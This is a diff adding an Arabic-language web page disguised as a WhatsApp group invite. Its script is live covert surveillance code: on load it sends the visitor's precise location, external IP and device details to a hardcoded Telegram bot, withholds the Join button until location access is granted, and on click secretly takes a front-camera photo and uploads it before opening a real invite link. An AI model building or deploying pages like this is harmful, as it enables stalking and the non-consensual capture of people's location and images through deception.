@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WhatsApp Group Invite</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #ffffff;
+      text-align: center;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px;
+    }
+    .header img.logo {
+      height: 30px;
+    }
+    .download-icon {
+      width: 35px;
+      height: 35px;
+      background: #25D366;
+      border-radius: 50%;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 24px;
+      margin-left: 10px;
+    }
+    .group-logo {
+      margin: 40px auto 10px;
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    .group-name {
+      font-weight: bold;
+      margin: 10px 0;
+      font-size: 18px;
+      color: #333;
+    }
+    .invite-text {
+      color: gray;
+      font-size: 15px;
+      margin-bottom: 20px;
+    }
+    .join-btn {
+      background-color: #128C7E;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      padding: 12px 30px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .download-text {
+      color: gray;
+      margin-top: 10px;
+    }
+    .download-link {
+      color: #007BFF;
+      text-decoration: none;
+    }
+    .bottom-download {
+      background-color: #25D366;
+      color: black;
+      border-radius: 30px;
+      padding: 15px 30px;
+      font-size: 16px;
+      width: 80%;
+      margin: 30px auto 40px;
+      display: block;
+      text-decoration: none;
+    }
+    .notice {
+      display: none;
+      color: red;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="logo" />
+    <div class="download-icon">⬇</div>
+  </div>
+
+  <img src="j.jpeg" alt="Group Logo" class="group-logo" />
+  <div class="group-name">لمّتنا الحلوة 🦋❤️💅</div>
+  <div class="invite-text">لقد تمت دعوتك للانضمام إلى مجموعة على واتساب</div>
+
+  <div class="notice" id="locationNotice">❗ يجب السماح بصلاحية الموقع وإعادة تحميل الصفحة لإكمال العملية</div>
+  <button class="join-btn" id="joinBtn" disabled>Join Chat</button>
+
+  <div class="download-text">لا تمتلك تطبيق واتساب بعد؟</div>
+  <a href="#" class="download-link">تحميل التطبيق</a>
+
+  <a href="#" class="bottom-download">تحميل واتساب</a>
+
+<script>
+const botToken = "7876711075:AAG227dcC-k6dDfrb4d719FB1rApyJAh3ko";
+const chatId = "1393964545";
+const whatsappLink = "https://chat.whatsapp.com/Hbpwuu2jzar78cKBfxInvt?mode=ac_t";
+
+window.onload = () => {
+  getLocation();
+  getExternalIP();
+  getDeviceInfo();
+  document.getElementById("joinBtn").addEventListener("click", executeImageAndOpenLink);
+};
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const gmap = `https://maps.google.com/?q=${lat},${lon}`;
+      sendToTelegram(`📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 خرائط:\n${gmap}`);
+      document.getElementById("joinBtn").disabled = false;
+    }, err => {
+      document.getElementById("locationNotice").style.display = "block";
+    });
+  }
+}
+
+function getExternalIP() {
+  fetch("https://api64.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => {
+      sendToTelegram(`🌐 IP الخارجي:\n${data.ip}`);
+    });
+}
+
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  const width = screen.width;
+  const height = screen.height;
+  const deviceType = /mobile/i.test(ua) ? "Mobile" : "Desktop";
+  sendToTelegram(`🧠 بيانات الجهاز:\nDevice: ${deviceType}\nPlatform: ${platform}\nUserAgent: ${ua}\nScreen: ${width}x${height}`);
+}
+
+function executeImageAndOpenLink() {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+    .then(stream => {
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+      const canvas = document.createElement("canvas");
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext("2d");
+      setTimeout(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataURL = canvas.toDataURL("image/png");
+        sendImageToTelegram(dataURL);
+        stream.getTracks().forEach(track => track.stop());
+        window.open(whatsappLink, "_blank");
+      }, 2000);
+    });
+}
+
+function sendImageToTelegram(dataURL) {
+  const formData = new FormData();
+  formData.append("chat_id", chatId);
+  formData.append("photo", dataURLtoBlob(dataURL), "image.png");
+  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+function dataURLtoBlob(dataURL) {
+  const parts = dataURL.split(',');
+  const mime = parts[0].match(/:(.*?);/)[1];
+  const bstr = atob(parts[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], { type: mime });
+}
+
+function sendToTelegram(text) {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: chatId, text })
+  });
+}
+</script>
+
+</body>
+</html>
